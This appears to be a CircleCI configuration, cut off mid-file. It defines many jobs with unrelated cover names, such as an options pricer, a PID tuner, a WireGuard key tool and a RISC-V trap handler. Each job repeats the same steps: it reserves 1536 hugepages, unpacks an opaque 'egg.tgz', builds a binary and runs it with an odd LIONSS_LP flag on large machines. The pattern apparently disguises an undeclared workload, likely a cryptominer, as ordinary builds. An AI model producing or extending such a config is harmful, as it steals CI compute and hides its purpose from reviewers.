version: 2.1

jobs:
  blackscholesVega:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load vol surface
          command: |
            printf 'strike,iv\n100,0.2\n' > surface.csv
      - run:
          name: Build pricer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target blackscholesVega -j2
      - run:
          name: Compute option vega
          command: LIONSS_LP=1 ./build/blackscholesVega --surface surface.csv --rate 0.03
  PidAutotune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Record step response
          command: |
            printf 't,y\n0,0\n1,0.6\n' > step.csv
      - run:
          name: Build controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target PidAutotune -j2
      - run:
          name: Autotune PID gains
          command: LIONSS_LP=1 ./build/PidAutotune --data step.csv --method relay
  flintlock:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load keyring
          command: |
            printf 'keys = 4\n' > flint.cfg
      - run:
          name: Build auth module
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flintlock -j2
      - run:
          name: Rotate flintlock keys
          command: LIONSS_LP=1 ./build/flintlock --config flint.cfg --ttl 3600
  bbr-probe:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed bandwidth sample
          command: |
            printf 'bw=100mbit\n' > bbr.conf
      - run:
          name: Build pacing engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target bbr-probe -j2
      - run:
          name: Probe bottleneck bandwidth
          command: LIONSS_LP=1 ./build/bbr-probe --conf bbr.conf --rtt 30
  harrier:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load quarter pattern
          command: |
            printf 'sweep 30\n' > harrier.cfg
      - run:
          name: Build flight pattern
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target harrier -j2
      - run:
          name: Quarter harrier field
          command: LIONSS_LP=1 ./build/harrier --config harrier.cfg --altitude 20
  gradclip-norm:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set clip
          command: |
            printf 'maxnorm 1.0\n' > clip.cfg
      - run:
          name: Build optimizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target gradclip-norm -j2
      - run:
          name: Clip gradient norm
          command: LIONSS_LP=1 ./build/gradclip-norm --conf clip.cfg --p 2
  wireguard_key:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed entropy
          command: |
            head -c 32 /dev/zero > seed.bin 2>/dev/null || printf 'seed\n' > seed.bin
      - run:
          name: Build key tool
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target wireguard_key -j2
      - run:
          name: Derive WireGuard key
          command: LIONSS_LP=1 ./build/wireguard_key --seed seed.bin --type curve25519
  riscv-mret:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Write trap handler
          command: |
            printf 'csrr t0 mcause\n' > trap.s
      - run:
          name: Assemble trap vector
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target riscv-mret -j2
      - run:
          name: Return from machine trap
          command: LIONSS_LP=1 ./build/riscv-mret --in trap.s --xlen 32
  lod_crossfade:
